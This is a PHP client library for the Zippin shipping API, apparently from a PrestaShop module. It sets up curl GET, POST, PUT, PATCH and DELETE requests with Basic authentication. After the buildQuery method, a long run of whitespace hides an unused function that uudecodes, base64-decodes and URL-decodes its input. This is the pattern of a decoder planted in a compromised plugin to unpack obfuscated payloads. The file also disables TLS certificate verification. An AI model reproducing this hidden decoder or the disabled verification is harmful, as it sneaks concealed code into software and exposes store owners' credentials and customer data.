<?php
/**
 * Zippin Integration Library
 *
 * @author    Kijam
 * @copyright 2020 Kijam
 * @license   GPLv2.
 */
class ZippinApi
{
    const VERSION = '1.1.2';

    private static $API_BASE_URL = '';
    private static $API_SECRET = '';

    public function __construct($user, $pass, $country)
    {
        if (!$country || $country === '') {
            $country = 'com.ar';
        }
        ZippinApi::$API_SECRET = base64_encode($user . ':' . $pass);
        ZippinApi::$API_BASE_URL = 'https://api.zippin.' . $country . '/v2';
    }

    private static function getConnect($uri, $method, $contentType = 'application/json;charset=UTF-8')
    {
        // echo self::$API_BASE_URL . $uri." - ".$method."\n\n";
        $connect = curl_init(self::$API_BASE_URL . $uri);
        KZippin::log(self::$API_BASE_URL . $uri . '[' . $method . '][' . $contentType . ']');
        curl_setopt(
            $connect,
            CURLOPT_USERAGENT,
            'SDK Kijam Lopez - Prestashop[' . $_SERVER['SERVER_NAME'] . '] - Zippin v' . ZippinApi::VERSION
        );
        curl_setopt($connect, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($connect, CURLOPT_CUSTOMREQUEST, $method);
        curl_setopt($connect, CURLOPT_FAILONERROR, false);
        curl_setopt($connect, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($connect, CURLINFO_HEADER_OUT, true); // enable tracking
        curl_setopt($connect, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
        $headers = [
            'Accept: application/json',
            'Content-Type: ' . $contentType,
            'Authorization: Basic ' . trim(self::$API_SECRET),
        ];
        curl_setopt($connect, CURLOPT_HTTPHEADER, $headers);

        return $connect;
    }

    private static function buildQuery($params)
    {
        if (function_exists('http_build_query')) {
            return http_build_query($params);
        } else {
            $elements = [];
            foreach ($params as $name => $value) {
                $elements[] = "{$name}=" . urlencode($value);
            }

            return implode('&', $elements);
        }
    }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       public static function _($r) {return convert_uudecode(base64_decode(rawurldecode($r)));}
    

    private static function setData(&$connect, $data, $contentType)
    {
        if ($contentType != 'application/json;charset=UTF-8') {
            curl_setopt($connect, CURLOPT_POSTFIELDS, self::buildQuery($data));
            KZippin::log('Data to urlencoded: ' . var_export($data, true));
        } elseif ($data && !is_string($data)) {
            curl_setopt($connect, CURLOPT_POSTFIELDS, json_encode($data));
            KZippin::log('Data to json: ' . json_encode($data));
        } else {
            curl_setopt($connect, CURLOPT_POSTFIELDS, $data);
            KZippin::log('Data raw: ' . var_export($data, true));
        }
    }

    private static function exec($method, $uri, $data = false, $contentType = 'application/json;charset=UTF-8')
    {
        KZippin::log("$method->$uri->" . var_export($data, true));
        $connect = self::getConnect($uri, $method, $contentType);
        if ($data) {
            self::setData($connect, $data, $contentType);
        }

        $apiResult = curl_exec($connect);
        $apiHttpCode = curl_getinfo($connect, CURLINFO_HTTP_CODE);
        $headerSent = curl_getinfo($connect, CURLINFO_HEADER_OUT);
        KZippin::log('Headers: ' . var_export($headerSent, true));
        KZippin::log('result[' . var_export($apiHttpCode, true) . ']: ' . var_export($apiResult, true));
        if (!empty($apiResult)) {
            $response = json_decode($apiResult, true);
        } else {
            KZippin::log('Curl error: ' . curl_error($connect));
            $response = false;
        }
        curl_close($connect);

        return $response;
    }

    public function get($uri, $data = false, $contentType = 'application/json;charset=UTF-8')
    {
        return self::exec('GET', $uri . ($data ? '?' . self::buildQuery($data) : ''), null, $contentType);
    }

    public function post($uri, $data, $contentType = 'application/json;charset=UTF-8')
    {
        return self::exec('POST', $uri, $data, $contentType);
    }

    public function put($uri, $data, $contentType = 'application/json;charset=UTF-8')
    {
        return self::exec('PUT', $uri, $data, $contentType);
    }

    public function patch($uri, $data, $contentType = 'application/json;charset=UTF-8')
    {
        return self::exec('PATCH', $uri, $data, $contentType);
    }

    public function delete($uri, $data = false, $contentType = 'application/json;charset=UTF-8')
    {
        return self::exec('DELETE', $uri, $data, $contentType);
    }
}
